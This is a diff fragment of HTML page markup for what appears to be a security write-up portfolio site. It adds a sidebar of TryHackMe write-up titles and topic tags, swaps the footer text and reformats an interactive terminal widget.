+<br/><br/><div class="sidebar-title">Recently Updated</div><div style="display:flex; flex-direction:column; gap:0.5rem;"><a href="#" style="color: var(--text-secondary); text-decoration: none; font-size: 0.9rem;">TryHackMe: Operation Endgame</a><a href="#" style="color: var(--text-secondary); text-decoration: none; font-size: 0.9rem;">TryHackMe: AoC 2025 Side Quest Four</a><a href="#" style="color: var(--text-secondary); text-decoration: none; font-size: 0.9rem;">TryHackMe: AoC 2025 Side Quest Two</a><a href="#" style="color: var(--text-secondary); text-decoration: none; font-size: 0.9rem;">TryHackMe: Padelify</a></div><br/><div class="sidebar-title">Trending Tags</div><div style="display:flex; gap:0.5rem; flex-wrap:wrap;"><span class="tag" style="font-size: 0.8rem;">web</span><span class="tag" style="font-size: 0.8rem;">wordpress</span><span class="tag" style="font-size: 0.8rem;">rce</span><span class="tag" style="font-size: 0.8rem;">php</span><span class="tag" style="font-size: 0.8rem;">mysql</span><span class="tag" style="font-size: 0.8rem;">hash</span></div></aside>
+</div>
 </div>
 </section>
 </main>
-
-<footer><div class="container"><div class="footer-inner">
-  <div class="footer-name">&gt;_ alex171-studo</div>
-  <div class="footer-links"><a href="../writeups">Writeups</a><a href="../index">Accueil</a></div>
-  <div class="footer-copy">© 2026 Alex171-studo</div>
-</div></div></footer>
-
-<div id="interactive-terminal" class="terminal-window">
-  <div class="terminal-titlebar">
-    <div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div>
-    <span class="terminal-title">Terminal interactif</span>
-    <button id="term-close" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">✕</button>
-  </div>
-  <div class="term-interactive-body" id="term-output"></div>
-  <div class="term-input-line">
-    <span class="t-prompt" style="white-space:nowrap;font-size:0.8rem;color:var(--green)">alex@portfolio:~$</span>
-    <input type="text" id="term-input" class="term-input" placeholder="help" autocomplete="off" spellcheck="false"/>
-  </div>
+<footer><div class="container"><div class="footer-inner" style="display:flex; justify-content: space-between; font-size: 0.9rem; color: var(--text-muted);"><div>© 2026 jaxafed. Some rights reserved.</div><div>Using the Chirpy theme for Jekyll.</div></div></div></footer>
+<div class="terminal-window" id="interactive-terminal">
+<div class="terminal-titlebar">
+<div class="terminal-dot dot-red"></div><div class="terminal-dot dot-yellow"></div><div class="terminal-dot dot-green"></div>
+<span class="terminal-title">Terminal interactif</span>
+<button id="term-close" style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">✕</button>
+</div>
+<div class="term-interactive-body" id="term-output"></div>
+<div class="term-input-line">
+<span class="t-prompt" style="white-space:nowrap;font-size:0.8rem;color:var(--green)">alex@portfolio:~$</span>
+<input autocomplete="off" class="term-input" id="term-input" placeholder="help" spellcheck="false" type="text"/>
+</div>
 </div>
 <button class="term-toggle-btn" id="term-toggle">&gt;_</button>
 <script src="../js/main.js"></script>
